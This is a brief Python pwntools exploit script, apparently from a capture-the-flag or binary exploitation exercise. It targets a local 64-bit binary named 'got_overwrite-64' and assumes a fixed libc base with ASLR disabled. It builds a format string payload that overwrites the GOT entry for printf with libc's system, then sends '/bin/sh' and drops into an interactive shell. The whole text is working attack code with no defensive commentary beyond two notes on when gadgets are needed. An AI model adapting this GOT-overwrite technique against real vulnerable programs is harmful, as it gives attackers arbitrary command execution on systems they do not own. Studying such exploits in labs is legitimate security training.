# New info: Only ROP chain exploit need gadgets
# Format string exploit dont need gadgets

from pwn import *

elf = context.binary = ELF('./got_overwrite-64')
io = process()

libc = elf.libc


libc.address = 0x00007ffff7daf000		# ASLR disabled

payload = fmtstr_payload(6, {elf.got['printf'] : libc.sym['system']})


io.sendline(payload)

io.sendline('/bin/sh')


io.clean()
io.interactive()



